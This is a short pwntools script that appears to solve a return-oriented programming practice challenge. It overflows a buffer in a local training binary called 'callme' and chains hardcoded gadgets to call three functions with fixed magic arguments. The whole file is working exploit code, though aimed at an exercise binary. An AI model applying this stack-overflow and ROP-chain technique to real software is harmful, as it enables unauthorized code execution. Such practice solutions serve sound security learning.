# Also doable not using pop3 gadget

from pwn import *

elf = context.binary = ELF('./callme', checksec=False)
context.log_level = 'debug'

io = process()

pop_rdi = 0x4009a3
pop_rsi_rdx = 0x40093d
ret = 0x4006be

offset = 40

payload = flat(
	b'A' * offset,
	ret,
	pop_rdi,
	0xDEADBEEFDEADBEEF,
	pop_rsi_rdx,
	0xCAFEBABECAFEBABE,
	0xD00DF00DD00DF00D,
	elf.sym['callme_one'],
	pop_rdi,
	0xDEADBEEFDEADBEEF,
	pop_rsi_rdx,
	0xCAFEBABECAFEBABE,
	0xD00DF00DD00DF00D,
	elf.sym['callme_two'],
	pop_rdi,
	0xDEADBEEFDEADBEEF,
	pop_rsi_rdx,
	0xCAFEBABECAFEBABE,
	0xD00DF00DD00DF00D,
	elf.sym['callme_three']
)

io.sendline(payload)
io.interactive()